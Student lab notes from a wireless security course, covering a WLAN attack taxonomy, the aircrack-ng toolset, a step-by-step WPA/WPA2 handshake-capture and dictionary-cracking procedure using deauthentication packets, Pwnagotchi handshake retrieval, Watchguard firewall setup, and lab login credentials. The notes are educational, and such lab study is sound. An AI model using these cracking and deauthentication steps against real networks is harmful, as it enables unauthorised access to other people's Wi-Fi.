# Lab 01 - Wireless and Mobile Networks

- Interrupt connection between access point and mobile device, capture reconnect to crack password
- Used captured network traffic from Riccarton Mall and crack authentication dialogues

## WLAN Attack Taxonomy

Passive attacks:

- Traffic analysis
  - Packet size, type, fragmentation info etc.
  - APs periodically send out beacon frames
- Eavesdropping
  - Requires wireless cards with passive packet sniffing (and active packet injection for active attacks)

Active attacks:
- Unauthorized access
  - Masquerade as a legitimate user
  - Access to wireless components may give access to wired components
- Rogue access points (Evil-Twin attack)
  - Interrupt connection, then device automatically reconnects to strongest matching AP
- Man-in-the-middle attacks
  - ARP spoofing - spoof MAC of access point and victim to force all traffic to pass through attacker
- Session hijacking
  - Spoof MAC and force disconnect - in some architectures re-authentication not required
- Replay
  - Capture authentication packets, replay then later
- Denial of Service
  - Attacks against layer 1 (physical) or 2 (data link) cannot be stopped
  - NZ stock exchange attack: attacked DNS server

PSK (pre-shared key) used in labs: each node has string/passphrase that is combined with network SSID to generate unique encryption key for each client and session.

## Tools

Several tools available pre-installed in Kali-Linux

 - `airmon-ng`: set wireless adapter to monitor mode to sniff packets meant for other devices
 - `kismet`: wireless network detector, packet sniffer
 - `iwconfig`: check wireless adapter is in monitor mode
 - `airodump-ng`: capture packets and display access point properties (ethernet address, channel number, speed, etc.)
 - `aireplay-ng`: issue deauthentication packets and capture the automatic reconnection dialogue
 - `aircrack-ng`: decrypting keys captured by `aireplay-ng`
 - `airbase-ng`: establishing access point for evil-twin attack
 - `macchanger`: view/spoof MAC address

('ng' stands for 'next generation' - basically version 2)

Login:

- `cyberlab`: `$CyberLab!`
- `root`: `toor`

## WPA/WPA2 Password Cracking

- Kill DHCP server: `ps-eaf | grep dhc` then `kill -9 {process_id}`
- `iwconfig` to find interface name
- `airodump-ng {wireless_interface}`; scan for networks, determine channel number and MAC address (BSSID - *b*asic **s**ervice **s**et **id**entifier) of target AP
- `airmon-ng stop {wireless_interface}`
- `airmon-ng start {wireless_interface} {channel_number}` to enable monitor mode for a specific channel
- `iwconfig` to find the new monitoring network interface's name
- `airodump-ng -c {ap_channel} --bssid {ap_mac} -w {capture_file_path} {wireless_interface}`
  - Continue running the command
  - `BSSID` is the AP MAC, `STATION` is the victim's MAC
- `aireplay-ng -0 1 -a {ap_mac} -c {vicim_mac} {wireless_interface}`
  - Send 1 de-authentication packet (`-0 1` is short for `--deauth=1`)
    - The device will then automatically reconnect. `airodump-ng` will be able to capture the four-way handshake
      - PSK (pre-shared key) derived from passphrase. Both parties need to prove they hold the key without sending it over the wire
- (Optional) To see it working, go to Wireshark, select correct interface (Capture -> Options), filter using `eapol` (extensible authentication protocol over link layer)
- `aircrack-ng -w {path_to_dictionary} -b {victim_mac} {capture_file_path}`
  - Unzip gzip files: `gunzip {path}`
  - Cracks captured password

### Pwnagotchi

- Connect via USB
- `ifconfig -a`: ensure usb0 is being used as networking device
- `ifconfig usb0 10.0.0.1/24`: set IP of device
- `scp -r pi@10.0.0.2:/root/handshakes ~/handshakes`: copy files from Pwnagotchi to computer
  - Pwnagotchi contains PCAP files with format `{SSID name}_{BSSID}.pcap`

## Enterprise Security

- External interface: network that presents the security threat
- Trusted interface: private LAN/internal interface
- Optional interface: DMZ/mixed trust area. APs go here

Watchguard:

- All-in-one firewall + switch + wireless AP
- IP address of the Watchguard device: default gateway
- Add HTTP packet filter
  - Basically port filter: only allows tcp traffic in port 80
  - HTTP proxy allows packet contents to be inspected
  - Allow traffic From Any-Optional To Any-Trusted
    - *Initial* connection must be from outside to inside
- Set up wireless interface
  - Note IP and CIDR of interface 2
  - Create new bridge with IP and CIDR from above, optional security zone and DHCP enabled
  - Set interface 2 to bridge type, set bridge to the one made above
  - Enable wireless AP in bridge mode (using bridge from above)
  - At this point devices should be able to connect to the AP, and the firewall rule allows HTTP traffic from device to server connected to any trusted network
  - WPA2 Enterprise: can either set wireless network to use Firebox DB or RADIUS server (e.g. Active Directory) for authentication
